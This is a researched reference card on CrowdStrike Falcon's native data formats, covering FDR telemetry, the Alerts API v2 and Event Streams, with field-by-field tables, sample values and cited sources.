# EDR — CrowdStrike Falcon (Insight / Prevent)

Category: EDR · Vendor: CrowdStrike · Card status: researched 2026-10-01 · FDR samples expanded to full current-sensor field sets 2026-10-01

Two native representations exist and they are NOT interchangeable:

| Stream | What it is | Shape |
|---|---|---|
| **Falcon Data Replicator (FDR)** | Raw sensor telemetry (every process, DNS, network, file, logon event) under `data/`, plus host/user lookup records (`aidmaster`, `userinfo`, `managedassets`, `notmanaged`, `appinfo`) | Flat JSON, one object per line, **every value is a string** (exception: the `Attacks` array on classified events), PascalCase keys + a few lower-case keys (`aid`, `cid`, `aip`, `event_simpleName`, `event_platform`, `timestamp`, `name`, `id`) |
| **Alerts API v2** (`/alerts/entities/alerts/v2`) | Detection / alert objects (replaced the decommissioned Detects API) | Nested JSON, **snake_case** keys, typed values (ints, bools, arrays), ISO-8601 timestamps |
| Event Streams (`DetectionSummaryEvent` legacy / `EppDetectionSummaryEvent` current) | Push stream of detections to SIEM connectors | `{"metadata":{...},"event":{...}}`, **PascalCase** keys, typed values, epoch-seconds times |

Platform rule: telemetry events (process / DNS / network / file) are rendered as **FDR** objects; the alert
object is rendered as an **Alerts API v2** resource. Event Streams form is documented as an alternative
detection feed — never mix its PascalCase fields into an Alerts API object or vice versa.

---

## 1. Official / primary sources consulted

| URL | What it confirmed |
|---|---|
| https://developer.crowdstrike.com/api-reference/collections/alerts/ | Alerts service collection: `GetQueriesAlertsV2`, `PostEntitiesAlertsV2` (`/alerts/entities/alerts/v2`), `PatchEntitiesAlertsV3`, `PostAggregatesAlertsV2`; response envelope `meta` / `resources` / `errors`; update actions `update_status`, `assign_to_name`, `append_comment`, `add_tag`, `show_in_ui`, `unassign`; status values `in_progress`, `reopened` listed for updates |
| https://developer.crowdstrike.com/api-reference/collections/detects/ + https://docs.cloud.google.com/chronicle/docs/detection/migrate-detects-api-to-alerts-api + https://security.googlecloudcommunity.com/news-announcements-9/important-advisory-decommissioning-of-crowdstrike-s-detects-api-5923 | Detects API deprecated 2024-10-01, decommissioned 2025-09-30 → Alerts API is the current detection API |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-windows.log and `test-fdr.log` | Raw FDR objects (pre-parsing) for Win/Mac/Lin: `ProcessRollup2`, `SyntheticProcessRollup2`, `NetworkConnectIP4`, `DnsRequest`, `PeFileWritten`, `NewExecutableWritten`, `NewScriptWritten`, `UserLogon`, `AgentOnline` etc. Confirms all values are strings, `timestamp` = epoch-ms string, `ProcessStartTime`/`ContextTimeStamp` = `"<epoch-sec>.<ms>"` strings, `ImageFileName` uses `\Device\HarddiskVolumeN\...`, `ComputerName` is NOT on ProcessRollup2 (it is on `AgentOnline`/aidmaster) |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-fdr-epp-detection-summary.log | FDR also carries `EppDetectionSummaryEvent` with `ExternalApiType:"Event_EppDetectionSummaryEvent"` |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/alert/_dev/test/pipeline/test-alert.log | Raw Alerts API v2 resources: full key list (`composite_id`, `aggregate_id`, `agent_id`, `cid`, `cmdline`, `device{}`, `parent_details{}`, `grandparent_details{}`, `pattern_disposition`, `pattern_disposition_details{}`, `severity`, `severity_name`, `status`, `product`, `type`, `tactic`/`tactic_id`, `technique`/`technique_id`, `falcon_host_link`, `quarantined_files[]` ...). Product values seen: `epp`, `idp`, `overwatch`, `fcs`; type values `ldt`, `idp-user-endpoint-app-info`, `lead`, `cloud-ioa` |
| https://github.com/elastic/integrations/tree/main/packages/crowdstrike/data_stream/falcon/_dev/test/pipeline (`test-falcon-epp-detection-summary.log`, `test-falcon-detection-summary.log`) | Event Streams envelope `{"metadata":{"customerIDString","offset","eventType","eventCreationTime","version"},"event":{...}}`; legacy `DetectionSummaryEvent` (`DetectName`, `DetectDescription`, `ComputerName`, `SensorId`, `DetectId`, `NetworkAccesses[]`) vs current `EppDetectionSummaryEvent` (`Name`, `Description`, `Hostname`, `AgentId`, `CompositeId`, `AggregateId`) |

| https://github.com/splunk/security_content/blob/develop/data_sources/crowdstrike_processrollup2.yml (`example_log`) | A real Windows `ProcessRollup2V19` raw line (sensor build 18207, April 2024) with **40 fields** — adds `AuthenticodeHashData`, `SignInfoFlags`, `EventOrigin`, `Tags`, and the shortcut-launch fields `LinkName` + `ShowWindowFlags` to the older V16–V18 shape. The add-on's field list also shows the Splunk lookup-joined `aid_computer_name`, `aid_machine_domain`, `aid_ou`, `aid_site_name`, `aid_os_version`, `aid_system_product_name` — confirming that host context is joined from aidmaster, not carried by the old raw PR2 |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-windows.log (lines ~1–100: 2025 events with real key names and scrambled values; lines ~102–129: redacted-but-unscrambled events, including the event types added by https://github.com/elastic/integrations/pull/15846 — "The test events are collected from a live CrowdStrike instance") | Current Windows key sets: `ProcessRollup2` 40 fields, `DnsRequest` 28, `NetworkConnectIP4` 25, `NetworkReceiveAcceptIP4` 24, `PeFileWritten` 44, `NewExecutableWritten`/`NewScriptWritten` 32, `UserLogon` 34, `UserLogonFailed2` 27, `UserIdentity` 33, `EndOfProcess` 30, `AsepValueUpdate` 31, `RegGenericValueUpdate` 26, `ScriptControlScanTelemetry` 28. The live-instance lines from Sept–Oct 2025 (builds `1007.3.0019907.15`, `1007.3.0020907.15`, `1002.2.0019609.21`) carry **`ComputerName`** and **`LocalAddressIP4`** on the raw event (ServiceStarted, DriverLoad, PngFileWritten, ClassifiedModuleLoad, RegCrowdstrikeValueUpdate, FalconProcessHandleOpDetectInfo, FileWrittenWithEntropyHigh, FirewallRuleIP4Matched…) and an `Attacks` array (`[{"Tactic","Technique"}]`) on classified events |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-linux.log and `test-fdr-new-events.log` | `ProcessRollup2LinV12` (Oct 2025) carries `ComputerName`, `LocalAddressIP4`, `UserName` on the raw process event; every 2025 Windows event in `test-fdr-new-events.log` carries `LocalAddressIP4` + `EventOrigin` |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-fdr-command-history.log, `test-user-map.log`, `test-fdrv2-notmanaged.log`, `test-fdr.log` (aidmaster lines) | Raw `CommandHistoryV5` (24 fields, July 2025), raw `userinfo` record, raw `notmanaged` record, raw `aidmaster` records (32 fields: Mac and iOS hosts) |
| https://docs.panther.com/data-onboarding/supported-logs/crowdstrike/falcon-data-replicator | Schemas (descriptions copied from the CrowdStrike dictionary) for `AIDMaster`, `UserInfo`, `ManagedAssets`, `NotManagedAssets`, `AppInfo`, `ProcessRollup2` (cross-platform superset incl. `ComputerName`, `UserName`, `TreeId`), `NetworkConnect` (**`ConnectionDirection`: OUTBOUND=0, INBOUND=1, NEITHER=2, BOTH=3**; `ConnectionFlags` bits), `UserLogonLogoff` (**`LogonType` 2/3/4/5/7/8/9/10/11/12/13**, **`UserLogonFlags`** bits `LOGON_IS_SYNTHETIC 0x1`, `USER_IS_ADMIN 0x2`, `USER_IS_LOCAL 0x4`, `USER_IS_BUILT_IN 0x8`, `USER_IDENTITY_MISSING 0x10`), `UserIdentity` (`UserFlags` bits, `AuthenticationId` 996/997/999 meanings) |
| https://docs.cloud.google.com/chronicle/docs/ingestion/parser-list/cs-edr-changelog | Google SecOps `CS_EDR` parser began mapping the raw **`ComputerName`** field for `DnsRequest` + `SyntheticProcessRollup2` (2026-01-20), `ProcessRollup2` (2026-04-09), `ProcessRollup2Stats` (2026-05-05); `UserLogonFlags` on `UserLogon` (2026-07-09) |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/_dev/build/docs/README.md | FDR object types `aidmaster` / `userinfo` / `data` (from the S3 key path); host enrichment = join on `aid` (`host.id`); user enrichment = join on aid + user id; **`userinfo` requires Falcon Discover and covers only Windows** |
| https://github.com/CrowdStrike/logscale-community-content (`Queries-Only/Helpful-CQL-Queries/Combine ProcessRollup2 and DnsRequest Events.md`, `CrowdStrike-Query-Language-Map/CrowdStrike-Query-Language/correlate.md`, `Dashboards-Only/CVE-2025-1146.yaml`, `Dashboards-Only/apperrault_reddit_demo.yaml`) | Falcon NG-SIEM / LogScale view: event type is the tag field `#event_simpleName`; sensor data repo `#repo=base_sensor`; official examples read `ComputerName` and `FileName` directly from `#event_simpleName=ProcessRollup2` events; the host table is the lookup file `aid_master_main.csv` (`readFile()` / `match(file="aid_master_main.csv", field=[aid])`) |

Not publicly reachable: the Falcon Event Data Dictionary (falcon.crowdstrike.com/documentation, login only). Field
semantics below that come from community knowledge rather than a retrieved document are marked **UNVERIFIED**.
Field **presence** in the samples (section 4) comes only from real raw lines listed above; where a value's meaning is
not documented, the field is kept (it is real) but its value semantics are marked **UNVERIFIED**.

---

## 2. Native format & delivery path

- **FDR**: CrowdStrike writes gzip'd newline-delimited JSON to a CrowdStrike-hosted S3 bucket + SQS notification
  queue; the customer's collector (SIEM S3 input, FDR python consumer) pulls it. One JSON object per line, flat,
  no envelope. Telemetry under `data/`; "secondary" lookup records under their own prefixes:
  - `aidmaster` — one record per sensor (`aid`) with host identity: `ComputerName`, `MachineDomain`, `OU`, `SiteName`,
    `Version` (OS), `ProductType`, `AgentVersion`, hardware, geo, `FirstSeen`, `Time` (sample 4.9).
  - `managedassets` — per-sensor network identity: `aid`, `cid`, `_time`, `GatewayIP`, `GatewayMAC`, `MAC`, `MACPrefix`,
    `LocalAddressIP4`, `InterfaceAlias`, `InterfaceDescription` (Panther schema; no raw line retrieved — field list only).
  - `notmanaged` — hosts seen on the network by sensors but without a sensor (`ComputerName`, `CurrentLocalIP`, `MAC`,
    `discoverer_aid`, `FirstDiscoveredDate`, `LastDiscoveredBy`…; raw line in elastic `test-fdrv2-notmanaged.log`).
  - `userinfo` — Falcon Discover user inventory, **Windows only** (sample 4.10). `appinfo` — application inventory
    (`CompanyName`, `FileName`, `SHA256HashData`, `FileVersion`, `ProductName`, `ProductVersion`…).
  An analyst joins telemetry to `aidmaster` on `aid` (host name, OU, OS) and to `userinfo` / `UserLogon` /
  `UserIdentity` on `UserSid` (+ `aid`), see section 5.
- **Host context on the raw event (current sensors / 2025+)**: real FDR lines from late-2025 sensors also carry
  `ComputerName` and `LocalAddressIP4` (the host's own IP) directly on many event types — see section 1. Older lines
  (2020–2024) do not, and some 2025 lines (the scrambled-value set) lack them too, so the exact rollout per event
  type/tenant is **UNVERIFIED**. The platform renders current-sensor events, so samples 4.1–4.8 include them. The
  authoritative host record is still `aidmaster`.
- **Falcon Next-Gen SIEM / LogScale (Event Search)** — same PascalCase field names as FDR. Confirmed differences
  (CrowdStrike's own query repo, section 1): the event type is the **tag** `#event_simpleName` (not
  `event_simpleName`), sensor data lives in `#repo=base_sensor`, `@timestamp` is the LogScale event time,
  `ComputerName` and `FileName` are queryable directly on `ProcessRollup2`, and the host table is the lookup file
  `aid_master_main.csv`. Not confirmed by any retrieved source (do not emit): which other enrichment fields
  NG-SIEM adds, `FilePath`, `#type`, `#cid`. The platform shows the **FDR representation as canonical**.
- **Alerts API v2**: pull. `GET /alerts/queries/alerts/v2?filter=...` returns composite IDs; `POST /alerts/entities/alerts/v2`
  with `{"composite_ids":[...]}` returns `{"meta":{...},"resources":[ <alert>, ... ],"errors":[]}`. We render ONE element of `resources`.
- **Event Streams**: long-lived HTTPS stream (`/sensors/entities/datafeed/v2`), each line `{"metadata":...,"event":...}`.

Why: FDR is the only native per-event telemetry (process tree, DNS, sockets, file writes) and Alerts API v2 is the
current, supported detection object. Event Streams is accepted for detections only.

---

## 3. Core field reference

### 3a. FDR common fields (every event)

| Field | Type (as delivered) | Meaning | Example / values |
|---|---|---|---|
| `event_simpleName` | string | Event type | `ProcessRollup2`, `SyntheticProcessRollup2`, `EndOfProcess`, `DnsRequest`, `SuspiciousDnsRequest`, `NetworkConnectIP4`, `NetworkConnectIP6`, `NetworkListenIP4`, `NetworkReceiveAcceptIP4`, `PeFileWritten`, `NewExecutableWritten`, `NewScriptWritten`, `GenericFileWritten`, `OoxmlFileWritten`, `ZipFileWritten`, `ExecutableDeleted`, `UserLogon`, `UserLogonFailed2`, `UserIdentity`, `AsepValueUpdate`/`AsepFileChange`, `RegSystemConfigValueUpdate`, `ServiceStarted`, `DriverLoad`, `ClassifiedModuleLoad`, `AgentOnline`, `SensorHeartbeat`, `EppDetectionSummaryEvent` |
| `name` | string | Versioned event name | `ProcessRollup2V19`, `DnsRequestV4`, `NetworkConnectIP4V5` |
| `aid` | string (32 hex) | Agent (sensor) ID = host identity | `4d92d2adf9009775a446ce0fe2689915` |
| `cid` | string (32 hex) | Customer ID | `c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b` |
| `aip` | string | Host's external IP as seen by the cloud | `213.57.121.34` |
| `event_platform` | string | OS family | `Win`, `Mac`, `Lin` |
| `timestamp` | string (epoch ms) | Cloud receive time | `"1790669662417"` |
| `id` | string (UUID) | Event UUID | `"6a1f0c9e-9b42-11f1-8a6e-02b7c41d5e21"` |
| `ConfigBuild`, `ConfigStateHash`, `Entitlements`, `EffectiveTransmissionClass` | string | Sensor build/config metadata (`EffectiveTransmissionClass` is `"2"` on logon/identity events and `"3"` on process/network/file events in every retrieved Windows line; meaning of the classes **UNVERIFIED**) | `"1007.3.0019807.1"`, `"15"`, `"3"` |
| `EventOrigin` | string | Origin of the event inside the sensor; `"1"` on almost all Windows telemetry, `"17"` on some service/driver events (meaning of the values **UNVERIFIED**) | `"1"` |
| `ComputerName` | string | Host name — on **current** raw lines only (late-2025+; see section 2); older FDR lines need the `aidmaster` join | `"FIN-WS-0142"` |
| `LocalAddressIP4` | string | On non-network events of current sensors: the host's own local IPv4. On network events it is the socket's local address (always present there) | `"10.20.14.87"` |
| `Attacks` | **array** of `{"Tactic","Technique"}` | Only on events the sensor classifies (e.g. `ClassifiedModuleLoad`, `PngFileWritten`, `FileWrittenWithEntropyHigh`) — not on PR2/DNS/network | `[{"Tactic":"Defense Evasion","Technique":"Subvert Trust Controls"}]` |

### 3b. ProcessRollup2 (process start)

| Field | Type | Meaning | Example |
|---|---|---|---|
| `TargetProcessId` | string (decimal) | Falcon-unique ID of **this** process (UPID) | `"289741187433"` |
| `ParentProcessId` | string | `TargetProcessId` of the parent | `"289734651298"` |
| `SourceProcessId` / `SourceThreadId` | string | Process/thread that caused the create (usually = parent) | |
| `RawProcessId` | string | OS PID | `"7412"` |
| `ImageFileName` | string | Full image path in NT device form | `\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `CommandLine` | string | Full command line | |
| `ParentBaseFileName` | string | Parent image file name only | `WINWORD.EXE` |
| `SHA256HashData`, `SHA1HashData`, `MD5HashData` | string | Image hashes (SHA1 often all zeros on Windows) | 64 / 40 / 32 hex |
| `UserSid` | string | Token user SID | `S-1-5-21-...-1604` |
| `AuthenticationId` / `ParentAuthenticationId` | string | Logon ID (LUID) | `"2338751"`, `"999"` = SYSTEM |
| `IntegrityLevel` | string (decimal of RID) | `4096` Low, `8192` Medium, `12288` High, `16384` System | `"8192"` |
| `TokenType` | string | `1` primary, `2` impersonation | `"1"` |
| `SessionId` | string | Windows session | `"1"` |
| `ProcessStartTime` / `ProcessEndTime` | string `"<sec>.<ms>"` | Process start / end (end empty on PR2) | `"1790669662.402"`, `""` |
| `ImageSubsystem` | string | `2` GUI, `3` console | `"3"` |
| `ProcessCreateFlags`, `ProcessParameterFlags`, `ProcessSxsFlags`, `WindowFlags` | string | Bitmasks (Panther/CrowdStrike text: create flags from the original process create; `NtCreateUserProcess` parameter flags; flags from the Windows subsystem (CSRSS) path; window flags) | `"1024"`, `"24577"`, `"64"`, `"128"` |
| `SignInfoFlags` | string (decimal bitmask) | Image signature info. `"8683538"` seen on Microsoft-signed `powershell.exe` (Splunk 2024 line). Bit meanings and the value for an **unsigned** image are **UNVERIFIED** (sample 4.8 uses `"0"`) | `"8683538"` |
| `AuthenticodeHashData` | string (hex) | Authenticode (PE-signature) hash of the image — 40 hex chars in the 2024 Splunk line, 64 hex in 2025 elastic lines | 64 hex |
| `Tags` | string | `", "`-separated list of decimal internal tag IDs (e.g. `"25, 27, 874, 12094627905582, 12094627906234"`); IDs are not publicly decoded (**UNVERIFIED** meaning) | |
| `ComputerName`, `LocalAddressIP4`, `EventOrigin` | string | See 3a | |
| `LinkName`, `ShowWindowFlags` | string | Only when the process was launched from a shortcut (`.lnk` path in `LinkName`) — real 2024 line. Not emitted for the macro-spawned PowerShell | `"C:\\Users\\...\\Windows PowerShell.lnk"`, `"1"` |
| `RpcClientProcessId` | string | Only when the process was created on behalf of an RPC/COM client (UPID of the client) — real 2020 V18 line | |
| Dictionary-only (Panther schema, never seen on a retrieved Windows raw line — do not emit): `TreeId`, `UserName`, `WindowStation`, `Desktop`, `WindowTitle`, `WindowStartingPosition*`, `ApplicationUserModelId`, `CallStackModuleNames`, `OriginalCommandLine`, `CreateProcessType`, `ZoneIdentifier`, `HostUrl`, `ReferrerUrl` | | Situational per the dictionary; **UNVERIFIED** when/if they appear | |

### 3c. Context events (DNS / network / file)

| Field | Type | Meaning |
|---|---|---|
| `ContextProcessId` | string | `TargetProcessId` of the process that performed the action → join to ProcessRollup2.`TargetProcessId` |
| `ContextThreadId` | string | Acting thread (present on DNS / file / logon events; **absent** on every retrieved Windows `NetworkConnectIP4` / `NetworkReceiveAcceptIP4` line, 2020 and 2025 — so not emitted on 4.3) |
| `ContextImageFileName` | string | Acting process full NT path (file-write events of current sensors) |
| `ContextTimeStamp` | string `"<sec>.<ms>"` | Sensor-side time of the action (use this for timelines, not `timestamp`) |
| `ContextBaseFileName` | string | Acting process file name (newer sensors) |
| `DomainName` (DnsRequest) | string | Queried name |
| `RequestType` (DnsRequest) | string | DNS QTYPE number: `1` A, `5` CNAME, `28` AAAA, `16` TXT |
| `IP4Records`, `FirstIP4Record`, `CNAMERecords`, `RespondingDnsServer`, `DnsResponseType` (DnsRequest) | string | Answer data (`IP4Records` is `;`-separated with trailing `;`). Present only when an answer exists — a failed lookup (`QueryStatus` ≠ `0`, e.g. `9003`) carries none of them; `CNAMERecords` only when the answer has CNAMEs. `DnsResponseType` value meaning **UNVERIFIED** |
| `QueryStatus` (DnsRequest) | string | Windows DNS status code: `0` success, `9003` = DNS_ERROR_RCODE_NAME_ERROR (NXDOMAIN) seen on a real line |
| `DualRequest`, `DnsRequestCount`, `InterfaceIndex` (DnsRequest) | string | Dictionary: dual (A+AAAA) request flag, number of requests, interface index (Windows only) |
| `LocalAddressIP4`, `LocalPort`, `RemoteAddressIP4`, `RemotePort` (NetworkConnectIP4) | string | Socket 4-tuple |
| `Protocol` | string | IANA number: `1` ICMP, `6` TCP, `17` UDP |
| `ConnectionDirection` | string | `0` OUTBOUND, `1` INBOUND, `2` NEITHER, `3` BOTH (Panther schema text from the CrowdStrike dictionary — now verified) |
| `ConnectionFlags` | string | Bits: `1` RAW_SOCKET, `2` PROMISCUOUS_MODE_SIO_RCVALL, `4` …_IGMPMCAST, `8` …_MCAST (Panther schema) |
| `InContext` | string | Dictionary "in context" flag; `"0"` on every retrieved line (meaning **UNVERIFIED**) |
| `RemoteAddressString` | string | Seen once on a 2025 Windows NetworkConnectIP4 line with a scrambled value — semantics unknown, **not emitted** (**UNVERIFIED**) |
| `TargetFileName` (file events) | string | Written file, NT device path |
| `SHA256HashData`, `Size`, `FileIdentifier`, `IsOnNetwork`, `IsOnRemovableDisk`, `IsTransactedFile`, `FileOperatorSid`, `UserName`, `AuthenticationId`, `TokenType` (PeFileWritten) | string | File details + writer identity; hash may be absent on some write events |
| `MajorFunction`, `MinorFunction`, `IrpFlags`, `FileObject`, `FileEcpBitmask`, `OperationFlags`, `FileWrittenFlags` (file events) | string | Kernel file-system I/O context of the write (Windows IRP major/minor function codes, IRP flags, file-object pointer — `"0"` on current lines, ECP bitmask). Exact per-value meaning **UNVERIFIED** |
| `FileCategory` (file events) | string (enum) | File-type category; `"3"` on a real PngFileWritten, `"6"` on a (scrambled-value) PeFileWritten line — enum table **UNVERIFIED** |
| `DiskParentDeviceInstanceId` (file events) | string | PnP instance ID of the disk holding the file (`PCI\VEN_…&DEV_…\…`) |
| `ImageSubsystem`, `ImageEntryPoint`, `ImageTimeStamp`, `ImageCheckSum`, `DllCharacteristics`, `ModuleCharacteristics` (PeFileWritten) | string (decimal) | PE-header values of the written binary: subsystem (`2` GUI, `3` console), entry-point RVA, link timestamp (epoch sec), header checksum, `IMAGE_OPTIONAL_HEADER.DllCharacteristics`, `IMAGE_FILE_HEADER.Characteristics` (`34` = 0x22 executable + large-address-aware) |

### 3d. Alerts API v2 resource (detection)

| Field | Type | Meaning / values |
|---|---|---|
| `composite_id` | string | Primary key: `<cid>:ind:<aid>:<process_id>-<pattern_id>-<n>` (EPP) |
| `id` / `indicator_id` | string | `ind:<aid>:<process_id>-<pattern_id>-<n>` |
| `aggregate_id` | string | `aggind:<aid>:<tree id>` — groups alerts of one process tree |
| `agent_id`, `cid` | string | Host / customer |
| `product` | string | `epp` (endpoint), `idp` (identity), `overwatch`, `fcs` (cloud), `ngsiem`, `xdr`… |
| `type` | string | `ldt` (endpoint "lightweight detection"), `lead` (OverWatch), `cloud-ioa`, `idp-user-endpoint-app-info` |
| `name`, `display_name`, `description` | string | Detection pattern name + text |
| `severity` / `severity_name` | int 0-100 / string | `10` Informational, `30` Low, `50`/`40` Medium, `70` High, `90` Critical (bands; exact cut-offs **UNVERIFIED**) |
| `confidence` | int | 0-100 |
| `status` | string | `new`, `in_progress`, `closed`, `reopened` (`closed` from Falcon UI usage — not in the retrieved page, **UNVERIFIED**) |
| `tactic`, `tactic_id`, `technique`, `technique_id`, `objective` | string | MITRE (`TA0002`, `T1059.001`) or CrowdStrike-specific (`CSTA0004`, `CST0000`) |
| `scenario` | string | `suspicious_activity`, `NGAV`, `known_malware`, `intel_detection`, `attacker_methodology` … |
| `pattern_id` | int | Detection logic ID |
| `pattern_disposition` / `pattern_disposition_description` / `pattern_disposition_details{}` | int / string / object of bools | What the sensor did: `kill_process`, `process_blocked`, `quarantine_file`, `quarantine_machine`, `operation_blocked`, `policy_disabled`, `detect`, … |
| `process_id`, `parent_process_id`, `local_process_id` | string | Falcon UPID, parent UPID, OS PID |
| `cmdline`, `filename`, `filepath`, `sha256`, `md5`, `sha1`, `user_name`, `user_id`, `logon_domain` | string | Triggering process |
| `parent_details{}`, `grandparent_details{}` | object | `cmdline`, `filename`, `filepath`, `local_process_id`, `md5`, `sha256`, `process_graph_id`, `process_id`, `timestamp`, `user_graph_id`, `user_id`, `user_name` |
| `device{}` | object | `device_id`, `hostname`, `local_ip`, `external_ip`, `mac_address`, `machine_domain`, `os_version`, `platform_name`, `product_type_desc`, `agent_version`, `ou[]`, `site_name`, `status`, `groups[]`, `first_seen`, `last_seen` … |
| `timestamp`, `created_timestamp`, `updated_timestamp`, `context_timestamp`, `crawled_timestamp` | string (ISO-8601) | Detection / alert lifecycle times |
| `falcon_host_link` | string | Console deep link |
| `ioc_type`, `ioc_value`, `ioc_source`, `ioc_description`, `ioc_context[]` | string / array | IOC that fired (when IOC-based) |
| `quarantined_files[]`, `source_products[]`, `source_vendors[]`, `data_domains[]`, `show_in_ui`, `tree_id`, `tree_root`, `control_graph_id`, `triggering_process_graph_id` | mixed | |

### 3e. UserLogon (FDR) — the event that names the user

| Field | Type | Meaning / values |
|---|---|---|
| `UserName`, `LogonDomain`, `UserPrincipal`, `UserSid` | string | Who logged on (`dana.levi`, `NEXACORP`, UPN, SID) |
| `AuthenticationId` | string | Logon LUID — **the join key**: equals `AuthenticationId` on every PR2 / file event of that session on the same `aid` |
| `LogonType` | string | `2` INTERACTIVE, `3` NETWORK, `4` BATCH, `5` SERVICE, `7` UNLOCK, `8` NETWORK_CLEARTEXT, `9` NEW_CREDENTIALS, `10` REMOTE_INTERACTIVE, `11` CACHED_INTERACTIVE, `12` CACHED_REMOTE_INTERACTIVE, `13` CACHED_UNLOCK |
| `LogonTime`, `ContextTimeStamp` | string `"<sec>.<ms>"` | Logon time (sensor clock) |
| `LogonServer` | string | DC that authenticated the logon (empty for local/system logons) |
| `AuthenticationPackage` | string | `Kerberos`, `Negotiate`, `NTLM`… |
| `UserLogonFlags` | string (decimal bitmask) | `0x1` LOGON_IS_SYNTHETIC, `0x2` USER_IS_ADMIN, `0x4` USER_IS_LOCAL, `0x8` USER_IS_BUILT_IN, `0x10` USER_IDENTITY_MISSING (domain non-admin user → `"0"`) |
| `UserIsAdmin` | string | `"1"` / `"0"` |
| `UserFlags` | string (decimal bitmask) | Netlogon user flags (`LOGON_OPTIMIZED 0x4000`, `LOGON_WINLOGON 0x8000`, …); `"32"` seen on a real 2020 domain `UserIdentity` line — exact bits **UNVERIFIED** |
| `PasswordLastSet` | string `"<sec>.<ms>"` | Last password change (empty for SYSTEM) |
| `RemoteAccount` | string | `"1"` on real domain-account lines; meaning **UNVERIFIED** |
| `ClientComputerName` | string | Workstation name reported for the logon (`"-"` on a real SYSTEM/type-9 line); value for a local interactive logon **UNVERIFIED** |
| `PrivilegesBitmask`, `EnabledPrivilegesBitmask`, `UserGroupsBitmask` | string (decimal) | Token privilege / enabled-privilege / well-known-group bitmasks (current sensors). Bit tables not public — values in 4.7 are illustrative, **UNVERIFIED** |
| `ContextProcessId`, `ContextThreadId` | string | Process/thread that reported the logon |

Related logon events (real field sets, not sampled here): `UserLogonFailed2` (27 fields, 2025) — `UserName`, `LogonDomain`, `LogonType`, `Status` / `SubStatus` (NTSTATUS as unsigned decimal, e.g. `3221225578` = 0xC000006A wrong password), `RemoteAddressIP4`, `ClientComputerName`, `EtwRawProcessId`, `EtwRawThreadId`, `RawProcessId`, `TargetProcessId`; `UserIdentity` (33 fields) — `UserName`, `LogonDomain`, `UserPrincipal`, `UserSid`, `AuthenticationId`, `LogonId`, `LogonType`, `LogonServer`, `AuthenticationPackage`, `SessionId`, `UserCanonical`, `ResendToCloud`…; `UserLogoff` (`LogoffTime`, `UserLogoffType`).

### 3f. aidmaster record (host table)

| Field | Type | Meaning / values |
|---|---|---|
| `aid`, `cid`, `aip`, `event_platform` | string | Sensor ID (join key), customer, external IP, OS family |
| `ComputerName` | string | Host name |
| `MachineDomain`, `OU`, `SiteName` | string | AD domain, organizational unit, AD site (`"none"` when not domain-joined). Exact encoding of multiple OUs in the string **UNVERIFIED** (sample uses `;`) |
| `Version` | string | OS name: `"Windows 11"`, `"Big Sur (11.0)"`, `"iOS 18.3.2"` |
| `ProductType` | string | `1` Workstation, `2` Domain Controller, `3` Server |
| `AgentVersion`, `ConfigBuild`, `ConfigIDBuild` | string | Sensor version (`7.29.19807.0`) / config build — the middle number of `AgentVersion` = `ConfigIDBuild` |
| `AgentLoadFlags`, `AgentLocalTime`, `AgentTimeOffset` | string | Sensor loaded during (`0`) or after boot; sensor local epoch time; offset |
| `FirstSeen`, `Time` | string `"<sec>.<ms>"` | First time the cloud saw this `aid`; time of this record |
| `SystemManufacturer`, `SystemProductName`, `BiosManufacturer`, `BiosVersion`, `ChassisType`, `PointerSize`, `ServicePackMajor` | string | Hardware (`ChassisType` is text, e.g. `Laptop`; `PointerSize` `4`/`8`) |
| `City`, `Country`, `Continent`, `Timezone` | string | Geo of `aip` as seen by the cloud |
| `FalconGroupingTags`, `SensorGroupingTags`, `HostHiddenStatus` | string | Grouping tags (`-` when none), `Visible`/hidden |

### 3g. userinfo record (Falcon Discover, Windows only)

| Field | Type | Meaning / values |
|---|---|---|
| `UserSid_readable` | string | User SID — join key to `UserSid` on telemetry |
| `User` | string | `DOMAIN\user` (elastic also tests an object form `{"Name","ID"}` — **UNVERIFIED** which form current feeds use; sample uses the string) |
| `AccountType` | string | `Domain User`, `Domain Administrator`, `Local User` |
| `LocalAdminAccess`, `UserIsAdmin` | string | `Yes`/`No`; `1`/`0` |
| `LastLoggedOnHost` | string | Last host name the user logged on to |
| `LogonInfo`, `LogonType`, `LogonTime` | string | e.g. `Domain User Logon`, `Interactive`, epoch |
| `PasswordLastSet`, `monthsincereset` | string | Epoch; months since password reset (`"3.0"`) |
| `UserLogonFlags_decimal`, `_time`, `cid`, `event_platform` | string | Flags; record time; customer; platform |
| `DomainUser`, `UserName`, `LoggedOnHostCount` | string | In the Panther schema but not on the retrieved raw line — **UNVERIFIED**, not emitted |

### 3h. Other event types — real current field inventories (no sample in this card)

| Event | Fields on the newest retrieved Windows raw line (beyond the common `aid`/`aip`/`cid`/`id`/`name`/`timestamp`/`event_platform`/`event_simpleName`/`ConfigBuild`/`ConfigStateHash`/`Entitlements`/`EffectiveTransmissionClass`/`EventOrigin`) |
|---|---|
| `SyntheticProcessRollup2` | Mac/Lin only in samples: `TargetProcessId`, `ParentProcessId`, `SourceProcessId`, `SourceThreadId`, `RawProcessId`, `ImageFileName`, `CommandLine`, `ContextTimeStamp`, `ProcessStartTime`, `ProcessEndTime`, `SyntheticPR2Flags`, `SessionProcessId`, `ProcessGroupId`, `UID`/`GID`/`RUID`/`RGID`/`SVUID`/`SVGID`, `CapPrm` (Lin). Windows key set **UNVERIFIED** (Panther lists `ImageSubsystem`, `UserSid`, `AuthenticationId`, `IntegrityLevel`) |
| `NetworkReceiveAcceptIP4` | `ContextBaseFileName`, `ContextProcessId`, `ContextTimeStamp`, `LocalAddressIP4`, `LocalPort`, `RemoteAddressIP4`, `RemotePort`, `Protocol`, `ConnectionDirection` (`1`), `ConnectionFlags`, `InContext` |
